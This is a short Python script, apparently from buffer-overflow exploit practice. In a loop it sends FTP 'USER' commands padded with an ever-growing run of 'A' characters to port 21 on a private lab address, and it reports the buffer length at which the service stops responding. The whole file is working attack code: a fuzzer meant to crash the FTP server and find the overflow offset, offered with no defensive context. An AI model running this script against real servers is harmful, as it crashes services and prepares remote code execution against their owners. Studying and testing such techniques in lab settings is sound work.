import time
import socket
import sys

numberofcharacters = 100
packets = "USER /.:/" + "A" * numberofcharacters

while True:
    try:
        my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_socket.connect(("10.0.2.15",21))
        bytess = packets.encode(encoding="latin-1")
        my_socket.send(bytess)
        my_socket.close()
        packets = packets + "A" * numberofcharacters
        time.sleep(1)

    except KeyboardInterrupt as k:
        print("Crashed :" + str(len(packets)))
        sys.exit()
    except Exception as e:
        print("Crashed :" + str(len(packets)))
        print(e)
        sys.exit()
